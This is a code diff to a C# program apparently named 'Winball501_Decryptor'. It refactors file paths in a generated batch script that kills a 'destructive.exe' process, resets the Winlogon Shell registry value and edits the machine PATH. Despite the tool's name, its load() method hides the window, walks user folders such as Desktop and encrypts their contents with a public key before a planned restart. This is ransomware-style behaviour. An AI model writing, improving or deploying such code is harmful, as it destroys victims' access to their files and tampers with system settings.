@@ -37,19 +37,24 @@ namespace Winball501_Decryptor
                 sw.WriteLine("@echo off");
                 sw.WriteLine("echo Killing destructive.exe process...");
                 sw.WriteLine("taskkill /f /im destructive.exe");
-                sw.WriteLine("echo Removing \"C:\\Program Files\\utkudrk2\" folder...");
-                sw.WriteLine("rd /s /q \"C:\\Program Files\\utkudrk2\"");
+
+                // Using %ProgramFiles% to get the program files path dynamically
+                sw.WriteLine("echo Removing \"%ProgramFiles%\\utkudrk2\" folder...");
+                sw.WriteLine("rd /s /q \"%ProgramFiles%\\utkudrk2\"");
+
                 sw.WriteLine("echo Deleting Winlogon Shell registry key...");
                 sw.WriteLine("reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /f");
                 sw.WriteLine("echo Restoring Winlogon Shell to explorer.exe...");
                 sw.WriteLine("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /t REG_SZ /d \"explorer.exe\" /f");
-                sw.WriteLine("echo Deleting C:\\explorer.exe...");
-                sw.WriteLine("del /f /y \"C:\\explorer.exe\"");
+
+                // Using %SystemDrive% for explorer.exe path
+                sw.WriteLine("echo Deleting \"%SystemDrive%\\explorer.exe\"...");
+                sw.WriteLine("del /f /y \"%SystemDrive%\\explorer.exe\"");
 
                 // PATH Modification Section (as before)
                 sw.WriteLine("echo Reading machine PATH from registry...");
                 sw.WriteLine("for /f \"tokens=2,*\" %%A in ('reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" /v Path 2^>nul') do (");
-                sw.WriteLine("    set \"MACHINEPATH=%%B\"");
+                sw.WriteLine("    set \"MACHINEPATH=%%B\""); // Get the PATH value
                 sw.WriteLine(")");
                 sw.WriteLine("if not defined MACHINEPATH (");
                 sw.WriteLine("    echo Could not retrieve machine PATH.");
@@ -57,15 +62,15 @@ namespace Winball501_Decryptor
                 sw.WriteLine(")");
                 sw.WriteLine("echo Original machine PATH:");
                 sw.WriteLine("echo %MACHINEPATH%");
-                sw.WriteLine("set \"MACHINEPATH=%MACHINEPATH:\"=%\"");
+                sw.WriteLine("set \"MACHINEPATH=%MACHINEPATH:\"=%\""); // Remove quotes if any
                 sw.WriteLine("setlocal enabledelayedexpansion");
                 sw.WriteLine("for /f \"tokens=1* delims=;\" %%F in (\"!MACHINEPATH!\") do (");
                 sw.WriteLine("    set \"first=%%F\"");
                 sw.WriteLine("    set \"rest=%%G\"");
                 sw.WriteLine(")");
                 sw.WriteLine("echo First PATH entry is: \"!first!\"");
-                sw.WriteLine("if /I \"!first!\"==\"C:\\\" (");
-                sw.WriteLine("    echo Removing first PATH entry \"C:\\\" from the machine PATH...");
+                sw.WriteLine("if /I \"!first!\"==\"%SystemDrive%\\\" (");
+                sw.WriteLine("    echo Removing first PATH entry \"%SystemDrive%\\\" from the machine PATH...");
                 sw.WriteLine("    if defined rest (");
                 sw.WriteLine("        set \"newPath=!rest!\"");
                 sw.WriteLine("    ) else (");
@@ -75,7 +80,7 @@ namespace Winball501_Decryptor
                 sw.WriteLine("    echo Updating machine PATH to: \"%newPath%\"");
                 sw.WriteLine("    setx /M PATH \"%newPath%\"");
                 sw.WriteLine(") else (");
-                sw.WriteLine("    echo First PATH entry is not \"C:\\\". No changes made.");
+                sw.WriteLine("    echo First PATH entry is not \"%SystemDrive%\\\". No changes made.");
                 sw.WriteLine("    endlocal");
                 sw.WriteLine(")");
                 sw.WriteLine("echo Operation complete. You need to restart your PC for the changes to take effect.");
@@ -100,9 +105,9 @@ namespace Winball501_Decryptor
         public async void load()
         {
             this.Visible = false;
-            string encryptedfile = "C:\\encrypted.txt";
+            string encryptedFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "encrypted.txt");
 
-            if (!File.Exists(encryptedfile))
+            if (!File.Exists(encryptedFile))
             {
                 foreach (Environment.SpecialFolder folder in new[] {
     Environment.SpecialFolder.Desktop,
@@ -121,7 +126,7 @@ namespace Winball501_Decryptor
 
                 Encrypt encrypt1 = new Encrypt(this, publickey, downloadsPath);
                 tasks.Add(Task.Run(() => encrypt1.run()));
-                File.Create(encryptedfile).Close();
+                File.Create(encryptedFile).Close();
                 await Task.WhenAll(tasks);
                 this.Visible = true;
                 //Everything is done now restart PC
